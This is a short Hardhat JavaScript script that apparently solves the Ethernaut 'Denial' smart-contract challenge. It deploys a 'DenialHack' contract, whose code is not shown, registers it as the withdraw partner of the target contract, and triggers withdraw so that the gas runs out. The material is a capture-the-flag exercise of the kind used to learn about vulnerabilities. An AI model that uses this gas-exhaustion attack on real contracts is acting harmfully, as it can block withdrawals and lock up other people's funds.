const {ethers} = require("hardhat");
const {getContractAddress} = require("@ethersproject/address");
const {BigNumber} = require("ethers");
require('dotenv').config()

async function main() {
  const Denial = await ethers.getContractFactory("Denial");
  // const denial = await Denial.deploy();
  // await denial.deployed();
  const denial = Denial.attach(process.env.DENIAL_ADDR);
  console.log(`owner: ${await denial.owner()}`);

  const DenialHack = await ethers.getContractFactory("DenialHack");
  const denialHack = await DenialHack.deploy();
  await denialHack.deployed();

  let tx = await denial.setWithdrawPartner(denialHack.address);
  await tx.wait();
  console.log(`parner: ${ await denial.partner()}`);
  tx = await denial.withdraw({
    gasLimit: 1000000,
  });
  await tx.wait();
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
